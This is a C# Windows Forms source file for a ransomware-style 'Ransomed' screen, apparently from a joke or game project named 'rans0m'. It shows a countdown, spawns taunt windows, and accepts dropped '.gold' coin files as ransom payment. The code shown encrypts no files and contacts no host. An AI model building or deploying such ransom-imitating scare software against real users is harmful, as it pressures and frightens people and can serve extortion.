using NAudio.Wave;

namespace rans0m
{
    public partial class Ransomed : Form
    {
        // Really bad code, but I don't want to waste too much time on this, as long as it works 
        private int remainingTime = 3 * 26;

        public Ransomed() { InitializeComponent(); }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            DragDropFix.Allow(this.Handle);
        }

        private void Ransomed_Load(object sender, EventArgs e)
        {
            // Init the window
            lbl_time.Text = $"TIME: {remainingTime / 60:D2}:{remainingTime % 60:D2}";
            timer1.Start();
            Global.RandomPosControl(this);

            // Spawns 6 random taunt windows on load
            for (int i = 0; i < 6; i++)
            {
                TauntWindow tauntWindow = new TauntWindow();
                tauntWindow.Show();
            }

            new Thread(async () => Global.GlitchIdle(this, true)) { IsBackground = true }.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // Update remaining time, and the cash and time labels
            remainingTime--;
            txt_cashToPay.Text = Global.ransomLeft.ToString();
            lbl_time.Text = $"TIME: {remainingTime / 60:D2}:{remainingTime % 60:D2}";
        }


        // ------------ EVENT HANDLERS ------------------------------------------
        private void Ransomed_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                // TODO : Check if file is a valid .gold file
                e.Effect = DragDropEffects.Link;
            }
        }

        private void Ransomed_DragDrop(object sender, DragEventArgs e)
        {
            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

            bool sfxPlayed = false;
            foreach (string file in files)
            {
                if (file.EndsWith(".gold"))
                {
                    try
                    {
                        Dictionary<string, string> goldFileData = GoldCoinManager.DecryptCoinFile(file);

                        if (!Global.usedCoins.Contains(goldFileData["RANSOM_COIN"])) // If coin hasn't been used yet (to prevent peoples from just copy pasting coins lol, although I should use the Registry value)
                        {
                            if (!sfxPlayed)
                            {
                                // Use the coin
                                WaveOut cashSfx = SoundHelper.Create(Properties.Resources.cash); // Need to replace the sfx it's kinda trash
                                cashSfx.Volume = 0.5f;
                                cashSfx.Play();
                                sfxPlayed = true;
                            }

                            Global.usedCoins.Add(goldFileData["RANSOM_COIN"]);
                            Global.ransomLeft -= 100;

                            File.Delete(file);
                        }
                    } 
                    catch { }
                    
                }
            }

            // If whole ransom has been paid
            if (Global.ransomLeft <= 0)
            {
                Global.underRansom = false;
                new ThankYou().Show();

                Dispose();
            }
        }

    }
}
